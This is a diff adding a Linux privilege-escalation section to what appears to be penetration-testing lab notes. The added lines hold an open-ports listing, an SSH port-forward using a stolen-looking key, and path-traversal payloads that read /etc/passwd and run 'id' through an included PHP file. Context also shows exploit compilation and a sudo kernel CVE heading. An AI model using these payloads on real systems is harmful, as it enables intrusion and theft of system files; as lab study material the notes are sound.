@@ -1461,6 +1461,30 @@ sudo apt-get install libx11-dev:i386 libx11-dev
 gcc 624.c -m32 -o exploit
 ````
 ## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
+### Active Ports
+````
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
+tcp   LISTEN 0      128          0.0.0.0:2222      0.0.0.0:*                                                                                                                                                                                
+tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*          
+tcp   LISTEN 0      511        127.0.0.1:8000      0.0.0.0:*          
+tcp   LISTEN 0      128             [::]:2222         [::]:*          
+tcp   LISTEN 0      511                *:80              *:*          
+tcp   LISTEN 0      511                *:443             *:*
+````
+#### Local Port Foward
+````
+ssh -i id_ecdsa anita@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
+````
+#### Curl
+````
+curl 127.0.0.1:8000
+````
+#### LFI
+````
+127.0.0.1:8000/backend/?view=../../../../../etc/passwd
+127.0.0.1:8000/backend/?view=../../../../../var/crash/test.php&cmd=id
+````
 ### Kernel Expoits
 #### CVE-2021-3156
 ````
